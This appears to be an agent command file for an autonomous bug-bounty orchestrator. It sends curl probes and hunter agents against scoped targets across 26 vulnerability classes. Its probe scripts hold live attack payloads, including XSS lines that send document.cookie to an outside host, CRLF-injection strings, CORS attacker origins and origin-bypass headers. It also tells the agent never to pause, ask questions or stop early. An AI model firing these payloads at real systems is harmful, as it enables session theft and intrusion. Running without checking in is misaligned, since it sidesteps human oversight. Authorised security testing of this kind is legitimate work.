---
name: autopilot
description: "Autonomous hunt orchestrator. INSATIABLE in --autonomous mode: enforces an EXHAUSTION CONTRACT (26 canonical hunter classes, surface probe A-I, depth-engine ≥25 attempts/class, wall-clock floor 90 min/target, PRE-COMPLETION GATE before any summary). No early stops, no clarifying questions, no auxiliary-agent substitution. Usage: /autopilot target.com [--interactive|--autonomous] [--20m-off] [--resume]"
disable-model-invocation: false
---
Autonomous hunt on: $ARGUMENTS

Parse flags from arguments:
- `--interactive` (default): Pause after each validated finding for user review
- `--autonomous`: Fully autonomous — no pauses, never auto-submits, produces ready-to-submit reports
- `--20m-off`: Disable 20-minute rotation timer on hunters
- `--resume`: Continue from previous session (read brain state for progress)

ALL agents dispatched by this command MUST use `model: "inherit"` in the Agent tool call.

## SETUP

1. Read `rules/hunting.md` AND `rules/mistakes.md` — both active throughout. `mistakes.md` lists lessons from real engagements ("Top 10 Most Common Mistakes" first); inject the Top 10 block into every subagent preamble because agents repeat these without the reminder.
2. Read `scope.yaml` — verify all targets are in scope
3. Read `policy.md` — extract ALL actionable constraints into a policy preamble:
   - Required HTTP headers (X-Bug-Bounty, User-Agent, custom tracking headers)
   - Account creation rules (email domain, naming conventions, company format)
   - Test environment setup (own instances, test properties, sandboxes)
   - Prohibited actions (DoS, social engineering, accessing customer data)
   - Rate limiting expectations
   - N-day waiting periods, shared responsibility exclusions
   - Credential usage restrictions
   - ANY other program-specific requirements
4. Format the **policy preamble** — this block is injected into EVERY agent dispatch:
   ```
   POLICY CONSTRAINTS (VIOLATION = DISQUALIFICATION/BAN):
   SCOPE AND POLICY MUST BE OBEYED AT ALL TIMES.
   [dynamically extracted constraints from policy.md]
   ALL HTTP requests MUST include required headers.
   ALL accounts MUST follow naming conventions.
   ALL testing MUST stay within scope boundaries.
   ```
5. `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py brief <target>` — load existing knowledge
6. If `--resume`: read brain for tested/exhausted/remaining targets, skip to HUNT LOOP
7. Capture run metadata for the pre-completion gate and stash it in `.autopilot-run.env`:
   ```bash
   {
     echo "RUN_START_EPOCH=$(date +%s)"
     echo "AUTOPILOT_MODE=<interactive|autonomous>"
     echo "AUTOPILOT_TARGET=<original /autopilot target argument>"
   } > .autopilot-run.env
   ```

## EXHAUSTION CONTRACT (autonomous mode is INSATIABLE — read before every loop iteration)

**`/autopilot --autonomous` IS INSATIABLE. The loop continues UNTIL every
target in scope has been tested with ALL techniques, ALL methods, ALL
bypasses, ALL tricks, AND ALL COMBINATIONS of these. DO NOT STOP. DO NOT
ASK THE USER ANYTHING.** No clarifying questions, no "should I continue?",
no "I think we're done" — autonomous mode runs until the PRE-COMPLETION
GATE passes for every target, the chain queue is empty, and the global
progress queue is empty. A 17-minute autonomous run that produced one
auxiliary-agent dispatch is a contract violation, not a completed
engagement. If you catch yourself thinking "this looks done", you are
wrong — return to the queue and dispatch the next class/combination.

`--autonomous` overrides any default LLM tendency toward minimalism,
clarification-seeking, or "I have enough information" reasoning. The only
acceptable termination paths are listed under "Stopping early is allowed
ONLY when" below; nothing else.

### Canonical Hunter Class Set (per target — every class fires OR records `not-applicable` with technical reason)

Per target, every class below either dispatches its specialized hunter agent
OR records a brain entry `not-applicable: <reason>` containing concrete
technical justification observed during the surface probe. "No JS source-sink
hits in the bundle" is NOT justification — that is static analysis, not
testing. Brain entries claiming exhaustion via auxiliary agents will be
rejected by the gate.

| Class | Hunter agent | Skip only if (must cite surface-probe evidence) |
|-------|--------------|--------------------------------------------------|
| idor | `idor-hunter` | No authenticated endpoints AND no object IDs in any URL/body |
| xss-reflected | `xss-hunter` (subtype: reflected) | No reflected query/header/path values across method-matrix probes |
| xss-stored | `xss-hunter` (subtype: stored) | No write surface (no comments, profiles, uploads, names, support form) |
| xss-dom | `xss-hunter` (subtype: dom) | Browser-runtime probe shows no `location.*`/`document.*`/innerHTML sinks fed by URL/hash |
| ssrf | `ssrf-hunter` | No URL/webhook/import/preview/fetch/avatar/screenshot parameters anywhere |
| sqli | `sqli-hunter` | No DB-backed endpoints (every API call is a static cache hit) |
| ssti | `ssti-hunter` | No template-rendering surface (comments, previews, admin templates, rules engines) |
| rce | `rce-hunter` | No deserialization, command-runner, expression-eval, or rule-engine surface |
| oauth | `oauth-hunter` | No OAuth/OIDC/SAML/JWT flow anywhere on target or its cookie-domain siblings |
| open-redirect | `open-redirect` | No redirect/returnTo/next/callback parameters anywhere in path/query |
| csrf | `csrf-hunter` | No state-changing endpoints AND every cookie has SameSite=Strict |
| cors | `cors-hunter` | Surface probe shows no Access-Control-* headers and no `OPTIONS` handlers |
| info-disclosure | `info-disclosure` | Surface probe found nothing AND no error/debug/build endpoints |
| race-condition | `race-condition` | No state mutations / billing / coupon / approval / non-idempotent ops |
| business-logic | `business-logic` | No multi-step workflows / pricing / approvals / coupons / trials |
| privilege-escalation | `privilege-escalation` | Single role only AND no admin/staff/billing endpoints |
| file-upload | `file-upload` | No upload endpoints AND no media import / avatar / attachment features |
| xxe | `xxe-hunter` | No XML / SOAP / SVG / SAML / DOCX / OPML / RSS parsing surface |
| graphql | `graphql-audit` | No GraphQL endpoint reachable on any sibling host |
| subdomain-takeover | `subdomain-takeover` | DNS probe shows no dangling CNAMEs / dead vendor pointers |
| llm-ai | `llm-ai-hunter` | No chatbot / RAG / agent / MCP / inference / model-server / sandbox surface |
| auth-bypass | `auth-tester` | No authentication / session / MFA / password-reset / SSO surface |
| cache-deception | SURFACE PROBE C + escalate via `auth-tester` if creds-bound HIT found | Probe C ran AND no caching layer present (no `cf-cache-status`, `x-cache`, `age` headers across all variants) |
| header-injection | SURFACE PROBE D + escalate via `xss-hunter`/`open-redirect` if reflection found | Probe D ran AND no `Set-Cookie`/`Location` reflection across all CRLF/Unicode variants |
| h2-desync | SURFACE PROBE F + custom PoC if 421/anomaly found | Probe F ran AND target negotiated HTTP/1.1 only OR no upstream HTTP/2 anomalies |
| method-confusion | SURFACE PROBE B + escalate via `idor-hunter`/`auth-tester` if anomaly found | Probe B ran AND uniform 405 for all non-listed verbs across discovered paths |

For the four SURFACE PROBE-driven classes above, "coverage" is satisfied by
running the corresponding probe in the SURFACE PROBE phase and recording
the probe result to brain. Escalation hunters are dispatched only when the
probe finds signal. A skipped probe = uncovered class = GATE FAIL.

### Forbidden hunter substitutes

These agents are **recon/auxiliary** — they CANNOT prove exhaustion of any
class above. Dispatching them does NOT advance the canonical checklist:

- `js-analyzer` (static analysis only — proves nothing about runtime behavior)
- `config-auditor` (header/CORS/cookie audit — feeder, not exhaustion)
- `waf-profiler` (WAF mapping — auxiliary to hunters, never replaces them)
- `sast-*` family (source-code analysis — only when source is locally available, never as DAST proxy)
- `cloud-recon` (asset enumeration — feeds recon, not exhaustion)
- `vuln-scanner` (DO NOT INVOKE — uses nuclei which is banned in this workspace; substitute httpx/ffuf/dirsearch via surface probe)

If the orchestrator dispatches any of these and concludes "exhausted", the
PRE-COMPLETION GATE rejects the run.

### Minimum runtime floors (autonomous mode)

- **Per P1 target**: ≥ 90 minutes wall clock OR until canonical checklist passes — whichever is later
- **Per autonomous run**: ≥ 18 distinct subagent dispatches across recon + hunters + validation
- **Per dispatched hunter class**: ≥ 25 attempt entries recorded in brain (Depth Engine floor)
- **Surface probe phase**: must complete (all of A-I) before any hunter dispatch
- **Per finding pipeline**: validator → browser-verifier (if client-side) → devil's advocate must all run

Stopping early is allowed ONLY when:
- Scope explicitly forbids further testing (policy.md), OR
- Circuit breaker tripped (5 consecutive 403/429 → 60s backoff → rotate host, run continues elsewhere), OR
- Context budget exhausted (> 60% used → checkpoint and request `--resume`), OR
- The PRE-COMPLETION GATE passes.

## RECON (skip if `recon/` data < 7 days old)

7. Dispatch `recon` agent (model: inherit) with policy preamble
8. Brain update: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> recon "<new endpoints, subdomains, tech stack>" "<recon summary>"`
9. Increment subagent counter
10. **Active recon depth (gated — every artifact below blocks completion unless a
    `recon-skip:<id> policy:<clause>` brain entry cites the policy clause that
    forbids it)**:
    - **DNS brute-force** with a region-aware wordlist into
      `recon/dns-bruteforce.txt`. Don't ship "passive only" — passive misses
      novel-named hosts (`prod-s0-milli-vanilli`, `prod-s0-telefonista`).
    - **Public archive sweep** into `recon/urlscan-cdx.json` (urlscan + Wayback
      CDX) and `recon/public-archives.txt` (any other archive hits). Pull
      historical URL inventory.
    - **GitHub code search** into `recon/github-code.json`. Query each in-scope
      domain for leaked endpoints, secrets, configs.
    - **Mobile decompile** if `scope.yaml` lists any mobile asset / package: pull
      APK/IPA, decompile, extract endpoints into
      `recon/mobile/<package>.endpoints.txt`. Mobile reveals endpoints the web
      surface never exposes.
    - To skip any of the above for genuine policy reasons, record:
      `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> recon "recon-skip:<id> policy:<clause>" "<rationale>"`

## WAF/CF DETECTION (run once per target, cache in brain)

10. Detect WAF and CF protection across live hosts:
    ```bash
    for host in $(cat recon/live-hosts.txt | head -20); do
      WAF=$(curl -sI "$host" 2>/dev/null | grep -iE "cf-ray|cloudflare|x-sucuri|x-akamai|x-datadome|server: awselb" | head -1)
      [ -n "$WAF" ] && echo "$host: $WAF"
    done
    ```
11. Record WAF map in brain: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> waf-map "<host→waf mappings>" "<counts by waf vendor>"`
12. If ANY hosts are CF-protected:
    - Start camofox: `$CLAUDE_PROJECT_DIR/tools/camofox_ctl.sh status || $CLAUDE_PROJECT_DIR/tools/camofox_ctl.sh start`
    - Verify stealth: check `/health` shows `browserRunning: true`
    - Record in brain: `camofox: running`
    - CF-protected hosts are P1 in ranking (less competition, stealth browser gives us edge)

## RANK

13. Dispatch `recon-ranker` agent (model: inherit) with:
    - Recon data + brain knowledge
    - WAF map (so ranker can factor CF-protection into P1/P2/Kill decisions)
    - Instruction: "CF-protected hosts WITH camofox available = P1 (competitive advantage). CF-protected hosts WITHOUT stealth browser = P2."
14. Parse P1/P2/Kill list from agent output
15. Brain update with ranking results
16. Increment subagent counter

## SURFACE PROBE (mandatory for every P1 host before HUNT LOOP — no agent dispatch, just curl)

The surface probe runs CHEAP inline curl-based checks (no agent dispatch
needed) to map dimensions hunter agents do not auto-discover. Every probe
either becomes a hunter dispatch with concrete payload OR is recorded to
brain as a coverage entry. This phase MUST run for every P1 host (every
host marked P1 in `ATTACK_SURFACE_RANKING.md` AND every novel-named live
host per Rule 30) before any hunter is dispatched. Refusing to run it is
a PRE-COMPLETION GATE fail.

**The loop is per-HOST, not per-TARGET.** A wildcard target like
`*.example.com` decomposes into N live hosts, each of which gets its own
`evidence/<host>/surface/` directory and its own A-I run. Cross-host
inference ("BR was hardened so CO is too") is forbidden by Rule 30 —
every host produces its own probe artifacts.

```bash
# Build the P1 host list
P1_HOSTS=$(awk '/^P1[: ]/{print $2}' ATTACK_SURFACE_RANKING.md \
            || cat recon/p1-hosts.txt 2>/dev/null \
            || cat recon/live-hosts.txt)

for TARGET in $P1_HOSTS; do
  mkdir -p "evidence/$TARGET/surface"
  # ... run A-I below with this TARGET ...
done
```

Inside the per-host loop, perform A through I in order. Save raw output
to `evidence/$TARGET/surface/` (the directory is created above). After I
completes, write the per-host completion marker (see "Persist surface
completion" at the end of this section).

### A. Path / file enumeration

```bash
TARGET="<host>"  # replace with the host being probed
mkdir -p "evidence/$TARGET/surface"
for path in robots.txt sitemap.xml security.txt humans.txt \
            .well-known/security.txt .well-known/openid-configuration \
            .well-known/jwks.json .well-known/oauth-authorization-server \
            .well-known/webfinger .well-known/host-meta \
            .well-known/change-password .well-known/assetlinks.json \
            .well-known/apple-app-site-association \
            .git/config .git/HEAD .env .env.local .env.production \
            crossdomain.xml clientaccesspolicy.xml \
            CHANGELOG.md README.md package.json composer.json \
            yarn.lock package-lock.json \
            __nextjs_original-stack-frame _next/static/chunks/webpack.js \
            api/ admin/ _admin/ api/v1/ api/v2/ api/internal/ \
            api/admin/ auth/ oauth/ saml/ graphql v1/ v2/ \
            internal/ _internal/ debug/ status/ health/ \
            metrics actuator actuator/health server-status \
            wp-admin/ wp-login.php phpmyadmin/ console/; do
  curl -s -o /dev/null -w "$path %{http_code} %{size_download}\n" \
    "https://$TARGET/$path"
done | tee evidence/$TARGET/surface/discovery.txt
```

If Next.js detected, enumerate `_next/data`:

```bash
BUILD_ID=$(curl -s "https://$TARGET/" \
  | grep -oE '"buildId":"[^"]+"' \
  | head -1 \
  | cut -d'"' -f4)
[ -z "$BUILD_ID" ] && BUILD_ID=$(curl -s "https://$TARGET/" \
  | grep -oE '_next/static/[a-zA-Z0-9_-]{6,}/' | head -1 \
  | cut -d'/' -f3)
for page in index sandbox stores/create stores login dashboard \
            admin profile settings billing api/auth/me; do
  curl -s -o /dev/null -w "_next/data/$BUILD_ID/$page.json %{http_code}\n" \
    "https://$TARGET/_next/data/$BUILD_ID/$page.json"
done | tee -a evidence/$TARGET/surface/discovery.txt
```

Record any 200/301/302/401/403 (anything non-404) as ATTACK SURFACE for
hunter dispatch. A 401 on `/api/admin/` is a P1 — not a 404.

### B. HTTP method matrix per discovered path

For every path that returned 200/301/302/401/403:

```bash
: > "evidence/$TARGET/surface/method-matrix.txt"
awk '$2 ~ /^(200|201|204|301|302|303|307|308|401|403)$/ {print $1}' \
  "evidence/$TARGET/surface/discovery.txt" | sort -u | while read -r PATH; do
  for METHOD in OPTIONS HEAD GET POST PUT PATCH DELETE TRACE CONNECT \
                PROPFIND COPY MOVE MKCOL LOCK UNLOCK; do
    curl -s -o /dev/null -w "$METHOD $PATH: %{http_code} %{size_download}\n" \
      -X $METHOD "https://$TARGET/$PATH"
  done
done | tee -a "evidence/$TARGET/surface/method-matrix.txt"
```

Method-specific 200/302/500 (vs. 405 elsewhere) = method confusion or
hidden verb routing → DISPATCH `auth-tester` (subtype: methods) and
`idor-hunter` with explicit verb list.

### C. Cache deception probes

```bash
for path_variant in "/profile.css" "/profile.js" "/profile.png" \
                    "/profile/index.css" "/profile;.css" "/profile%23.css" \
                    "/profile?ext=.css" "/profile/../profile.css" \
                    "/profile.css/" "/profile//.css" \
                    "/api/me.css" "/dashboard.json"; do
  RESP=$(curl -sI "https://$TARGET$path_variant" \
    -H "Cookie: session=test" \
    | grep -iE "cache-control|cf-cache-status|x-cache|age|content-type")
  echo "$path_variant: $RESP"
done | tee evidence/$TARGET/surface/cache-deception.txt
```

Sensitive content body returned with `cf-cache-status: HIT` or `age: > 0`
after a cookie request → web cache deception confirmed → DISPATCH
`auth-tester` (subtype: cache) for poisoning verification.

### D. Response header / response splitting probes

```bash
for vec in "%0d%0aSet-Cookie:%20pwn=1" \
           "%0aLocation:%20//evil.tld" \
           "%E5%98%8A%E5%98%8DSet-Cookie:%20pwn=1" \
           "%0d%0aX-XSS-Protection:%200%0d%0a"; do
  for param in next returnTo url to callback continue rd dest redirect; do
    curl -sI "https://$TARGET/?$param=$vec" \
      | grep -iE "set-cookie|location|x-xss"
  done
  curl -sI "https://$TARGET/$vec/" | grep -iE "set-cookie|location"
done | tee evidence/$TARGET/surface/header-injection.txt
```

Any injected `Set-Cookie` or unsafe `Location` reflection → DISPATCH
`auth-tester` (subtype: response-splitting) and record open-redirect
candidate for chain-builder.

### E. CORS preflight matrix

```bash
for origin in "https://evil.tld" "null" "https://$TARGET.evil.tld" \
              "http://$TARGET" "https://attacker.$TARGET" \
              "https://${TARGET}.attacker.tld" "file://" \
              "https://evil.tld%60.${TARGET}" "https://${TARGET}%23.evil.tld"; do
  for path in / api/ api/v1/ api/me api/user graphql auth/me; do
    curl -sI -X OPTIONS "https://$TARGET/$path" \
      -H "Origin: $origin" \
      -H "Access-Control-Request-Method: GET" \
      -H "Access-Control-Request-Headers: authorization,content-type" \
      | grep -iE "access-control-allow"
  done
done | tee evidence/$TARGET/surface/cors-matrix.txt
```

Any `allow-origin` reflecting attacker origin AND `allow-credentials: true`
→ DISPATCH `cors-hunter` immediately.

### F. HTTP/2 desync indicators

```bash
{
  curl --http2 -sI "https://$TARGET/" \
    -H "Transfer-Encoding: chunked" -H "Content-Length: 0"
  curl --http2-prior-knowledge -sI "https://$TARGET/" \
    -H "Connection: close"
  curl --http2 -sI "https://$TARGET/" \
    -H "Transfer-Encoding: chunked, identity"
  curl --http2 -s "https://$TARGET/" \
    -H "Content-Length: 0" -H "Content-Length: 5" -X POST -d 'X'
} | tee "evidence/$TARGET/surface/h2-desync.txt"
```

Mismatched `content-length` vs `transfer-encoding` handling, 421
Misdirected Request, or 400 with body marker leakage → DISPATCH
`auth-tester` (subtype: smuggling) with desync template.

### G. Subdomain takeover on the target itself

```bash
{
  dig +short CNAME $TARGET
  HOST_RESP=$(curl -sI "https://$TARGET/" 2>&1)
  echo "$HOST_RESP" \
    | grep -iE "no such bucket|repository not found|domain not configured|herokuapp|github\.io|s3-website|trafficmanager|cloudfront|fastly|netlify|surge.sh|readme\.io|helpjuice|tumblr|unbouncepages|wpengine"
} | tee "evidence/$TARGET/surface/takeover.txt"
```

Any vendor "no such resource" pattern → DISPATCH `subdomain-takeover` with
the dangling pointer.

### H. Cloudflare-specific probes (only if CF detected)

```bash
{
  curl -sI "https://$TARGET/" -H "Accept-Encoding: gzip" | grep -iE "cf-cache|vary"
  curl -sI "https://$TARGET/" -H "Accept-Encoding: deflate" | grep -iE "cf-cache|vary"
  curl -s "https://$TARGET/" -H "CF-Connecting-IP: 127.0.0.1" \
    -o /dev/null -w "%{http_code}\n"
  curl -s "https://$TARGET/" -H "X-Forwarded-For: 127.0.0.1" \
    -o /dev/null -w "%{http_code}\n"
  ORIGIN_IP=$(dig +short $TARGET | head -1)
  curl -sk "https://$ORIGIN_IP/" -H "Host: $TARGET" \
    -o /dev/null -w "Direct origin: %{http_code}\n"
  # CF cache key smuggling via Range
  curl -sI "https://$TARGET/" -H "Range: bytes=0-0" | grep -iE "cf-cache|content-range"
} | tee "evidence/$TARGET/surface/cloudflare.txt"
```

Cache poisoning via Vary, CF-Connecting-IP trust, direct-origin reach, or
Range smuggling → record candidates and DISPATCH appropriate hunter.

### I. SPA / hash routing seeds (rotate detection tokens — Rule 28)

Detection-token rotation: never rely on `alert(1)` alone. The probe
values below walk the rotation ladder so a target that filters `alert`
but not `prompt`/`title`/preload still produces a reflection signal.

```bash
for param in next redirect returnTo url to callback continue rd \
             destination ref source state code id_token; do
  for value in \
      "//evil.tld" \
      "javascript:alert(1)" \
      "javascript:prompt(1)" \
      "javascript:confirm(document.domain)" \
      "javascript:document.title='XSS-AAB123'" \
      "javascript:fetch('//c.oast.fun/?'+document.cookie)" \
      "javascript:new%20Image().src='//c.oast.fun/?'%2bdocument.cookie" \
      "javascript:top[8680439..toString(30)](1)" \
      "javascript:window['ale'+'rt'](1)" \
      "javascript:self[atob('YWxlcnQ=')](1)" \
      "data:text/html,<svg/onload=fetch('//c.oast.fun/?d')>" \
      "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+" \
      "https://$TARGET@evil.tld" \
      "%2F%2Fevil.tld" \
      "/%2F/evil.tld" \
      "//evil.tld%23.${TARGET}"; do
    curl -s "https://$TARGET/?$param=$value" \
      -o "evidence/$TARGET/surface/route-$param-$(echo "$value" | md5sum | cut -c1-6).html" \
      -w "$param=$value: %{http_code} %{size_download} %{redirect_url}\n"
  done
done | tee "evidence/$TARGET/surface/spa-routing.txt"
```

Reflected param value in HTML/JS, 30x to attacker host, or any
`javascript:` URI accepted in `Location:` → seed for `xss-hunter`,
`open-redirect`, and `oauth-hunter` dispatch. The hunter prompt MUST
forward the rotation ladder so it doesn't re-test only `alert(1)`.

### Persist surface completion + per-probe coverage

After all of A-I complete on a host, write the per-host completion marker
AND the surface-driven class coverage records via the structured writer.
Both are per-host artifacts the gate keys off; missing either fails
completion:

```bash
# Per-host completion marker — gate requires this for every P1 host AND
# requires every required artifact mtime <= the marker's mtime, so writing
# this BEFORE the artifacts have all been produced will trip the gate.
date -u +"%Y-%m-%dT%H:%M:%SZ" > "evidence/$TARGET/surface/.complete"
```

```bash
# Surface-probe-driven classes: each gets its own coverage entry so the
# gate's class-coverage check finds it. Use the structured writer (NOT
# bare brain.py) — writer signs off on the JSON shape the gate prefers.

for CLASS_PROBE in \
    "cache-deception:cache-deception.txt" \
    "header-injection:header-injection.txt" \
    "h2-desync:h2-desync.txt" \
    "method-confusion:method-matrix.txt"; do
  CLASS="${CLASS_PROBE%:*}"
  PROBE="${CLASS_PROBE##*:}"
  # Pick one of: no-signal | signal:<details> | candidate-dispatched:<hunter>
  STATUS="no-signal"  # set per actual probe outcome, e.g. "candidate-dispatched:cors-hunter"
  uv run python3 $CLAUDE_PROJECT_DIR/tools/coverage_record.py \
    --host "$TARGET" --class "$CLASS" \
    --surface-status "$STATUS" \
    --evidence "evidence/$TARGET/surface/$PROBE"
done

# Master surface entry (markdown is fine here — this is informational, not
# a coverage gate input)
uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record "$TARGET" recon "surface-probe" \
  "discovery:<count non-404>; methods:<count anomalies>; cache-deception:<results>; \
   response-splitting:<results>; cors-perms:<results>; h2-desync:<results>; \
   takeover:<results>; cf-quirks:<results>; spa-routing:<results>"

# Unauthenticated state-change anomalies — for every POST/PUT/PATCH/DELETE
# that returned 2xx/3xx in method-matrix.txt, record an unauth-write marker.
# The hard gate auto-detects these from the surface artifact too, but the
# brain marker triggers the adversarial battery dispatch below.
awk '
  $1 ~ /^(POST|PUT|PATCH|DELETE)$/ &&
  $3 ~ /^(200|201|202|204|301|302|303|307|308)/ {
    sub(/:$/, "", $2); print $1, $2, $3
  }' "evidence/$TARGET/surface/method-matrix.txt" \
| while read -r METHOD PATH STATUS; do
    uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record "$TARGET" recon \
      "unauth-write:$PATH" \
      "method:$METHOD; status:$STATUS; evidence:evidence/$TARGET/surface/method-matrix.txt"
  done
```

Refusing to run any of A-I before HUNT LOOP is a PRE-COMPLETION GATE fail.
Any 200/301/302/401/403 the probe finds becomes a hunter dispatch input —
the orchestrator MUST seed step 22's hunter prompts with the discovered
surface, not just the homepage URL.

### UNAUTH STATE-CHANGE BATTERY (mandatory follow-up)

Every `unauth-write:<path>` marker recorded above blocks completion until
its sibling `adversarial-battery:<path>` entry exists with attempts ≥ 10
across the five required dimensions. **An unauthenticated 2xx/3xx on
POST/PUT/PATCH/DELETE that the autopilot walks away from is the failure
mode this contract was written to prevent.** For each marker:

1. Build the battery evidence file `evidence/$TARGET/battery-<slug>.jsonl`
   where `<slug>` is the path with `/` replaced by `-`.
2. Dispatch the relevant hunters in parallel (model: inherit), each
   appending its results to that JSONL:
   - `business-logic` — mass-assignment, applicant-id collision, status
     manipulation, currency / price coercion
   - `xss-hunter` (subtype: stored) — payload injection in every JSON
     field with rotation ladder per Rule 28
   - `ssti-hunter` — when the path or surrounding service hints at
     templates/rules engines (rule-engine, comment, message, render,
     template names, Clojure/Jinja/Velocity/Twig/Freemarker fingerprints)
   - `race-condition` — replay the endpoint in parallel with state-mutation
     queries
   - `chain-builder` — extract `rules/chain-table.md` anchors for the
     resulting capability and probe the next links
3. After hunters return, record the battery result via the structured
   writer of choice. The brain marker MUST cover every dimension:
   ```bash
   uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record "$TARGET" recon \
     "adversarial-battery:$PATH" \
     "attempts:<≥10>; mass-assignment:<done|signal:<details>>; \
      payload-fields:<done|signal>; id-collision:<done|signal>; \
      race:<done|signal>; chain-anchors:<done|signal:<which-anchor>>; \
      evidence:evidence/$TARGET/battery-<slug>.jsonl"
   ```
4. If any hunter surfaces a confirmed finding, run it through the FINDING
   PIPELINE (Gate 1/2/3) before continuing. Battery completion does not
   replace per-finding validation.

## HUNT LOOP (for each P1 target)

17. `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py brief <target>` — what's tested on this target?
18. Tech stack detection:
    ```bash
    curl -sI https://<target> | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"
    ```
19. Check WAF status from brain for this specific host
20. Build autonomous class hypotheses (MANDATORY):
    ```bash
    uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py classes \
      --tech-stack "<detected stack + recon hints>" \
      --target <target> \
      --limit 8 \
      --telemetry-path .autonomy-telemetry.json \
      --output CLASS_HYPOTHESES.md
    ```
    Use the ranked output to decide vuln class dispatch order.
21. Allocate autonomous class budgets (MANDATORY):
    ```bash
    uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py budget \
      --tech-stack "<detected stack + recon hints>" \
      --target <target> \
      --total-minutes 120 \
      --total-tokens 30000 \
      --telemetry-path .autonomy-telemetry.json \
      --output CLASS_BUDGET.md
    ```
    Use this budget when deciding how many rounds to spend per vuln class.

## DEPTH ENGINE (mandatory before marking any class exhausted)

Autopilot runs deeper than a single-payload probe. Before any hunter dispatch
and after every hunter return, the following anti-shallow rules are in force:

1. **Variant matrix first.** For the endpoint and vuln class, build the matrix
   `method × content-type × auth-state × parser-confusion × encoding × transport`
   before sending the first request. Call `uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py matrix
   <class>` to seed it where a profile exists.
2. **Baseline controls.** Send a known-benign probe and a known-malicious probe
   first so bypasses are measured against a calibrated response delta.
3. **Minimum-attempt floor: 25 distinct attempts per endpoint/class** before
   any "exhausted" verdict, unless a hard policy/scope/WAF block is proven
   with level-by-level evidence.
4. **Encoding ladder per payload.** raw → url → double-url → unicode escapes →
   html entities → mixed-case / separator insertion. Keep the semantic payload
   constant across the ladder. Then **stack encodings** in a single payload —
   WAFs typically decode once, targets decode twice. Try at minimum: `html-entity
   then url` (`%26lt%3Bscript%26gt%3B`), `url then double-url`
   (`%253Cscript%253E`), `unicode-escape then url` (`%5Cu003cscript%5Cu003e`),
   and `base64 inside url-encoded data URI`. Log which decoding order the
   target actually applies.
5. **Parser-differential tricks.** Duplicate params, array/object coercion,
   JSON vs form-body drift, HTTP parameter pollution, alternate delimiters.
6. **Auth-state rotation.** unauth + low-priv user A + low-priv user B +
   high-priv (if available) + expired token + stale session + cross-tenant.
   Compare status, body length, markers, and timing — not just status codes.
7. **Sequence / state-machine abuse.** For workflow endpoints (billing,
   approvals, profile updates, idempotency keys), replay, race, duplicate,
   and reorder state transitions to catch business-logic and race bugs.
8. **Combination pass.** At least 8 combined variants per endpoint. Cross
   dimensions (encoding + method override, parser-confusion + alt
   content-type, HPP + JSON/form drift) AND stack within dimensions
   (url + html-entity in the same payload, url + unicode, double-url +
   html-entity). Layered encodings defeat WAFs whose decoder runs once.
9. **Cross-endpoint replay.** Every payload that fires (even partially) on
   endpoint A is replayed on every sibling endpoint under the same router
   before the branch is abandoned. This is Rule 8 of `rules/hunting.md`.
10. **Second-opinion dispatch.** Any candidate that survives the first
    hunter as "potential" must trigger one different specialist (e.g.
    `dast-devils-advocate` or a sibling hunter) for adversarial
    confirmation or kill decision.
11. **Exhaustion ledger quality bar.** Every exhausted record must include
    `variants_tried`, `dimensions_covered`, and `exact_blocker`. A generic
    "no vuln" entry is invalid and will be re-dispatched.
12. **Coverage persisted in brain via the structured writer.** Hunters do
    NOT write `coverage-<class>` markdown directly anymore — the gate
    rejects bare markers. Use the structured writer, which calls the
    exhaustion gate first and only writes if it passes:
    ```bash
    # dispatched class — most classes
    uv run python3 $CLAUDE_PROJECT_DIR/tools/coverage_record.py \
      --host <host> --class <class> \
      --attempts <N≥25> --variants <M> --combos-tested <T> --combos-remaining 0 \
      --encoding-steps <≥3> --differential-evidence \
      --blocker "<≥20-char concrete technical reason>" \
      --evidence evidence/<host>/coverage/<class>-attempts.jsonl

    # surface-driven class — cache-deception, header-injection, h2-desync, method-confusion
    uv run python3 $CLAUDE_PROJECT_DIR/tools/coverage_record.py \
      --host <host> --class <class> \
      --surface-status "no-signal|signal:<details>|candidate-dispatched:<hunter>" \
      --evidence evidence/<host>/surface/<probe>.txt
    ```
    The writer creates `evidence/<host>/coverage/<class>.json` and appends
    a `coverage-<class>` brain entry pointing at it. The hard gate prefers
    the JSON over the markdown line for substance checks.

22. **Iterate the Canonical Hunter Class Set** (see EXHAUSTION CONTRACT — 26 classes). For
    each class, you MUST either dispatch its specialized hunter OR record a
    `not-applicable: <class>` brain entry citing concrete surface-probe evidence
    (e.g., "no XML parsing surface — surface probe A returned no SOAP/SVG/SAML
    endpoints"). Auxiliary agents (`js-analyzer`, `config-auditor`,
    `waf-profiler`, `sast-*`, `cloud-recon`, `vuln-scanner`) DO NOT count
    toward class coverage — dispatch them only as feeders to actual hunters.

    Dispatch up to 3 hunters in parallel. Order priority by:
    a. Surface probe seeds — e.g., wildcard `Access-Control-Allow-Origin` →
       `cors-hunter` first; CF-Connecting-IP trust → `auth-tester` first;
       reflected `returnTo` → `open-redirect` + `oauth-hunter` first.
    b. Tech stack signals — GraphQL endpoint → `graphql-audit` early; Next.js
       Server Actions surface → `ssrf-hunter` early; chatbot/RAG/MCP →
       `llm-ai-hunter` early.
    c. Crown-jewel proximity — tenant boundaries / billing / admin / OAuth /
       file ingestion / AI tool execution = highest-CVSS chains.
    d. Default sequence: `idor` → `auth-bypass` → `xss-reflected` →
       `xss-stored` → `xss-dom` → `ssrf` → `sqli` → `oauth` → `open-redirect`
       → `cors` → `csrf` → `info-disclosure` → `race-condition` →
       `business-logic` → `privilege-escalation` → `file-upload` → `ssti` →
       `rce` → `xxe` → `graphql` → `llm-ai` → `subdomain-takeover` →
       `cache-deception` → `header-injection` → `h2-desync` →
       `method-confusion`.

    Continue iterating UNTIL every class either has a hunter dispatch or a
    not-applicable record. **Do NOT exit step 22 early** — the orchestrator
    cannot decide "the rest are obviously not applicable" without surface-
    probe evidence backing each not-applicable.

